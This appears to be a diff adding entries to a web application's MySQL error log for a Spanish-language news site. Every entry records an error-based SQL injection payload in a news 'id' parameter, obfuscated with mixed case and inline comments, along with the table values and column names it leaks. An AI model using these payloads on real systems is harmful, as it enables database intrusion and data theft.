+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 5,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:14
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2551!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 20,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:13
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!delicias1!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 3,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:12
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!chihuahua3!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 27,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:11
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2535!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 4,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:10
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!titular1!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 0,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:09
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2545!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 14,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:07
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2555!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 24,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:06
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!chihuahua2!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 9,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:05
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!nacional1!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 12,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:04
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2554!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 23,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:03
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2544!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 13,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:02
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2556!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 25,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:27:00
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2546!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 15,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:59
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!chihuahua3!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 10,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:58
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2533!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 2,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:57
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!titular2!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 1,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:56
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!titular1!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 17,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:55
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2553!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 22,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:54
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2542!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 11,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:53
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2551!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 20,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:52
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!mundo3!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 16,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:50
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2549!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 18,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:49
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!chihuahuaprincipal!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 5,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:48
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2538!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 7,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:47
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2550!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 19,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:46
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!delicias1!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 3,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:45
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!chihuahua2!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(ubicacion,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 9,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:44
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2557!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 26,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:43
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2559!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 28,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:42
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2552!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 21,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:41
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2539!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 8,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:40
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2560!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 29,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:39
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2558!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 27,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:38
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2537!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 6,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:36
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2548!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 17,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:35
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2536!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 5,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:34
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2547!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 16,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:33
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2540!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 9,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:32
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2541!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 10,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:31
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2543!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 12,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:30
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2534!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 3,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:28
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2532!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 1,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:27
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!2530!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,ifnull(id,char(32)),0x217e21) /**/fRoM delbd.noticias /**/lImIt 0,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:26:25
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!10122!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,count(0),0x217e21) /**/fRoM delbd.noticias)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:38
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!parrafo3!~!1' for key '<group_key>'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT(/**/sElEcT /**/dIsTiNcT /**/cOnCaT(0x217e21,/**/cOlUmN_NaMe,0x217e21) /**/fRoM information_schema./**/cOlUmNs /**/wHeRe /**/tAbLe_sChEmA=0x64656c6264 and /**/tAbLe_nAmE=0x6e6f746963696173 /**/lImIt 11,1)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 01:23:37
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!imagen3!~!1' for key '<group_key>'
